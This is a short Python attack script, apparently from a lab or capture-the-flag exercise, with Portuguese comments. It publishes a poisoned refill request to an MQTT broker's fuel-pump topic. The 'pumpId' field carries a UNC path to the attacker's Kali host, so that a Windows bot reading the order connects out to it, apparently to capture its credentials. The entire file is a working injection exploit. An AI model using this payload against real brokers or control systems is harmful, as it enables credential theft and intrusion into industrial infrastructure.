import json
import paho.mqtt.client as mqtt

BROKER = "10.10.100.100"
KALI_IP = "10.10.100.8"

client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
client.connect(BROKER, 1883, 60)

# Envenenando o ID da bomba diretamente com o caminho de rede UNC
# Quando o bot ler a ordem pendente para processar, o Windows dele tentará acessar seu Kali
payload = {
    "pumpId": rf"\\{KALI_IP}\share\PUMP003",
    "currentLevel": 5
}

TOPICO = "fuel-pumps/refill-request"

client.publish(TOPICO, json.dumps(payload))
print("[+] Ordem de serviço envenenada enviada para o painel!")
client.disconnect()
